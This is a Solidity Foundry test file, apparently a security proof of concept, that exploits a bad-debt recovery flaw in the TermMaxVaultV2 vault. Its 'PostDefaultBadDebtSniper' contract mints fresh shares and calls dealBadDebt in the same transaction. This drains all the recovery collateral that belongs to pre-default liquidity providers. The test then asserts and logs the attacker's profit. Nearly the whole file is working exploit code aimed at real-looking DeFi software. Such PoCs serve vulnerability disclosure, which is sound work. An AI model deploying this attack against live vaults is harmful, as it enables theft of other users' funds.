// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

import {TermMaxVaultV2} from "contracts/v2/vault/TermMaxVaultV2.sol";
import {VaultTestV2} from "./VaultV2.t.sol";
import {LoanUtils} from "./utils/LoanUtils.sol";

/// @notice Executes deposit -> dealBadDebt atomically from a contract that had
/// no vault shares before the bad debt was recognized.
contract PostDefaultBadDebtSniper {
    using SafeERC20 for IERC20;

    TermMaxVaultV2 public immutable vault;
    IERC20 public immutable asset;
    IERC20 public immutable collateral;

    constructor(TermMaxVaultV2 vault_, IERC20 asset_, IERC20 collateral_) {
        vault = vault_;
        asset = asset_;
        collateral = collateral_;
    }

    function attack(uint256 sharesToMint, uint256 badDebt, address beneficiary)
        external
        returns (uint256 capitalUsed, uint256 sharesBurned, uint256 collateralOut, uint256 residualShares)
    {
        capitalUsed = vault.previewMint(sharesToMint);

        asset.safeTransferFrom(msg.sender, address(this), capitalUsed);
        asset.forceApprove(address(vault), capitalUsed);

        // These two operations execute in the same transaction. The vault's
        // transaction-level deposit/withdraw guard does not cover dealBadDebt.
        vault.mint(sharesToMint, address(this));
        (sharesBurned, collateralOut) =
            vault.dealBadDebt(address(collateral), badDebt, address(this), address(this));

        residualShares = vault.balanceOf(address(this));
        collateral.safeTransfer(beneficiary, collateralOut);
    }
}

/// @notice Focused PoC built on TermMax's own VaultTestV2 fixture.
///
/// It proves all of the following in one test:
/// 1. recovery collateral belongs to pre-default LP shares before the attack;
/// 2. a contract with zero pre-default shares cannot claim it;
/// 3. after bad debt is publicly recorded, the same contract can atomically
///    mint fresh shares and consume the entire recovery collateral;
/// 4. the pre-default LP's share balance is unchanged, yet its recovery
///    collateral is gone;
/// 5. the oracle value of collateral received exceeds the attack capital,
///    even while residual attacker shares are valued at zero.
contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
    function test_PostDefaultDepositAtomicallyCapturesPreDefaultRecoveryCollateral() public {
        // Generate FT/XT imbalance in the vault-owned order.
        vm.warp(currentTime + 2 days);
        buyXt(48.219178e8, 1000e8);

        // Create a genuinely overcollateralized position that remains unpaid.
        address borrower = makeAddr("borrower");
        vm.startPrank(borrower);
        LoanUtils.fastMintGt(res, borrower, 1000e8, 1e18);
        vm.stopPrank();

        // Settle the order after maturity + liquidation window. At this point
        // badDebt and delivered collateral are fixed and publicly observable.
        vm.warp(currentTime + 92 days);
        vm.prank(curator);
        (uint256 badDebt, uint256 deliveredCollateral) = vault.redeemOrder(res.order);

        uint256 recoveryCollateral = res.collateral.balanceOf(address(vault));
        assertGt(badDebt, 0, "setup did not create bad debt");
        assertGt(recoveryCollateral, 0, "setup did not deliver collateral");
        assertEq(vault.badDebtMapping(address(res.collateral)), badDebt);
        assertEq(deliveredCollateral, recoveryCollateral);

        uint256 oldLpSharesBefore = vault.balanceOf(deployer);
        uint256 oldLpSupplyBefore = vault.totalSupply();
        assertGt(oldLpSharesBefore, 0, "pre-default LP has no shares");

        // Counterfactual control: immediately after default, the original LP
        // can burn its pre-default shares and receive all recovery collateral.
        uint256 snapshotId = vm.snapshot();
        vm.prank(deployer);
        (uint256 oldLpSharesBurned, uint256 oldLpCollateralOut) =
            vault.dealBadDebt(address(res.collateral), badDebt, deployer, deployer);
        assertGt(oldLpSharesBurned, 0);
        assertEq(oldLpCollateralOut, recoveryCollateral);
        assertEq(res.collateral.balanceOf(deployer), recoveryCollateral);
        assertTrue(vm.revertTo(snapshotId), "failed to restore pre-attack state");

        PostDefaultBadDebtSniper sniper = new PostDefaultBadDebtSniper(
            vault, IERC20(address(res.debt)), IERC20(address(res.collateral))
        );
        address attacker = makeAddr("post-default-attacker");

        // The attacker and its execution contract had no exposure before the
        // default and own no vault shares when bad debt is recognized.
        assertEq(vault.balanceOf(attacker), 0);
        assertEq(vault.balanceOf(address(sniper)), 0);

        // Negative control: without buying fresh shares, recovery cannot be
        // claimed by the attack contract.
        vm.prank(address(sniper));
        vm.expectRevert();
        vault.dealBadDebt(address(res.collateral), badDebt, address(sniper), address(sniper));

        // Mint slightly more than the pre-deposit preview to absorb at most a
        // few raw-unit rounding differences. Residual shares are deliberately
        // ignored in the profit calculation below.
        uint256 sharesToMint = vault.previewWithdraw(badDebt) + 10;
        uint256 quotedCapital = vault.previewMint(sharesToMint);
        res.debt.mint(attacker, quotedCapital);

        vm.startPrank(attacker);
        res.debt.approve(address(sniper), quotedCapital);
        (
            uint256 capitalUsed,
            uint256 attackerSharesBurned,
            uint256 attackerCollateralOut,
            uint256 residualShares
        ) = sniper.attack(sharesToMint, badDebt, attacker);
        vm.stopPrank();

        assertEq(capitalUsed, quotedCapital);
        assertGt(attackerSharesBurned, 0);
        assertLe(attackerSharesBurned, sharesToMint);
        assertEq(residualShares, sharesToMint - attackerSharesBurned);

        // The new entrant consumed the entire pre-existing recovery pool.
        assertEq(attackerCollateralOut, recoveryCollateral);
        assertEq(res.collateral.balanceOf(attacker), recoveryCollateral);
        assertEq(res.collateral.balanceOf(address(vault)), 0);
        assertEq(vault.badDebtMapping(address(res.collateral)), 0);

        // Existing LP shares were not burned or transferred. Nevertheless,
        // the recovery collateral they could claim before the attack is gone.
        assertEq(vault.balanceOf(deployer), oldLpSharesBefore);
        assertEq(vault.totalSupply(), oldLpSupplyBefore + residualShares);

        vm.prank(deployer);
        vm.expectRevert();
        vault.dealBadDebt(address(res.collateral), badDebt, deployer, deployer);

        uint256 collateralValueInDebtRaw = _collateralValueInDebtRaw(attackerCollateralOut);

        // This is deliberately conservative: the attacker's residual shares
        // are assigned zero value. Collateral alone exceeds all capital used.
        assertGt(
            collateralValueInDebtRaw,
            capitalUsed,
            "recovery collateral does not exceed attack capital"
        );

        console2.log("bad_debt_raw", badDebt);
        console2.log("attack_capital_raw", capitalUsed);
        console2.log("fresh_shares_minted", sharesToMint);
        console2.log("fresh_shares_burned", attackerSharesBurned);
        console2.log("residual_shares_ignored", residualShares);
        console2.log("recovery_collateral_raw", attackerCollateralOut);
        console2.log("collateral_value_in_debt_raw", collateralValueInDebtRaw);
        console2.log("conservative_profit_raw", collateralValueInDebtRaw - capitalUsed);
        console2.log("old_lp_shares_unchanged", oldLpSharesBefore);
    }

    function _collateralValueInDebtRaw(uint256 collateralAmount) internal view returns (uint256) {
        (uint256 collateralPrice, uint8 collateralPriceDecimals) =
            res.oracle.getPrice(address(res.collateral));
        (uint256 debtPrice, uint8 debtPriceDecimals) = res.oracle.getPrice(address(res.debt));

        uint256 numeratorScale =
            (10 ** IERC20Metadata(address(res.debt)).decimals()) * (10 ** debtPriceDecimals);
        uint256 denominatorScale =
            (10 ** IERC20Metadata(address(res.collateral)).decimals()) * (10 ** collateralPriceDecimals);

        return Math.mulDiv(
            collateralAmount,
            collateralPrice * numeratorScale,
            denominatorScale * debtPrice
        );
    }
}
